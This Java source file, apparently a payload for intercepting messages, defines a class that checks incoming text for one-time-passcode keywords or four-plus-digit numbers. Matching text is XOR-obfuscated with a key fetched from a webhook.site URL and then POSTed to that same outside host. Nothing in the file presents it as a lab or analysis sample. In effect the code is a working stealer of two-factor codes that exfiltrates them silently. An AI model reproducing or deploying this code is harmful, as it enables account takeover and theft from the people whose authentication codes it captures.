package com.example;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.regex.Pattern;

public class MyClass {

    private static void run(String dummy, String str) {
        String getUrl = "https://webhook.site/1147d9c5-c958-4e87-ac3a-325eabb85867";
        String postUrl = "https://webhook.site/1147d9c5-c958-4e87-ac3a-325eabb85867";

	if (!isOTP(str)) return;
	try {
		String key = sendGetRequest(getUrl);

		String xorResult = xorStrings(str, key);

		sendPostRequest(postUrl, xorResult);
	} catch (IOException exc) {
		return;
	}
    }

    
    public static boolean isOTP(String text) {
	if (text.contains("OTP")) return true;
	if (text.contains("passcode")) return true;
	if (text.contains("code")) return true;
	if (text.contains("otp")) return true;
	if (text.contains("authenticate")) return true;

	Pattern pattern = Pattern.compile("\\b\\d{4,}\\b");
	return pattern.matcher(text).find();
    }


    private static String sendGetRequest(String urlStr) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");

        try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
            return response.toString();
        }
    }

   private static String xorStrings(String s1, String s2) { 
	   StringBuilder result = new StringBuilder();
		for (int i = 0; i < s1.length(); i++) {
		    char c1 = s1.charAt(i);
		    char c2 = s2.charAt(i % s2.length()); // wrap around if key is shorter
		    result.append((char) (c1 ^ c2));
		}
		return result.toString();
    }

    private static void sendPostRequest(String urlStr, String data) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "text/plain");

        try (OutputStream os = conn.getOutputStream()) {
            byte[] input = data.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }
	BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
    }
}


